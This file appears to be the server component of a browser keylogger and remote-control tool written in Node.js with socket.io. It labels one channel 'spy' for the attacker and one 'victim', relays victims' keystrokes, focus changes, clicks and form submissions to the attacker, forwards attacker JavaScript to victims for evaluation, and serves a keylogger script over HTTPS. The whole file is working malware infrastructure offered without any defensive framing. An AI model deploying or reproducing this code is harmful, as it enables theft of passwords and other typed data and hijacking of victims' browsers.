import express from 'express';
import http from 'http';
import https from 'https';
import fs from 'fs';
import path from 'path';
import { Server } from 'socket.io';

const __dirname = path.resolve()

const app = express();
const socketServer = http.createServer(app);
const io = new Server(socketServer);

const spy = io
    .of('/spy')
    .on('connection', (socket) => {
        console.log('Attacker connected.');
        socket.on('eval', function (js) {
            console.log('Remote JS:', js);
            victim.emit('eval', js);
        });

        socket.on('disconnect', () => {
            console.log('Attacker disconnected.');
        });
    });

const victim = io
    .of('/victim')
    .on('connection', (socket) => {
        console.log('Victim connected');

        socket.on('type', function (key) {
            console.log('victim/type:', key);
            spy.emit('type', key);
        });

        socket.on('focus', function (focus) {
            console.log('victim/focus:', focus);
            spy.emit('focus', focus);
        });

        socket.on('click', function (click) {
            console.log('victim/click:', click);
            spy.emit('submit', click);
        });

        socket.on('submit', function (submit) {
            console.log('victim/submit:', submit);
            spy.emit('submit', submit);
        });


        socket.on('disconnect', function () {
            console.log('Victim disconnected');
        });
    });

app.use("/", express.static(path.join(__dirname, 'public')));

var privateKey = fs.readFileSync(__dirname + '/certs/server.key', 'utf8');
var certificate = fs.readFileSync(__dirname + '/certs/server.crt', 'utf8');

var encryption = {
    key: privateKey,
    cert: certificate
};

https.createServer(encryption, (req, res) => {
    fs.readFile(__dirname + '/app/utils/keylogger.js', function (err, data) {
        if (err) {
            res.writeHead(404);
            res.end(JSON.stringify(err));
            return;
        }
        res.writeHead(200);
        res.end(data);
    });
}).listen(8443, () => {
    console.log('Delivery server: https://0.0.0.0:8443');
});

socketServer.listen(3000, () => {
    console.log('WebSocket server listen on ws://0.0.0.0:3000');
});
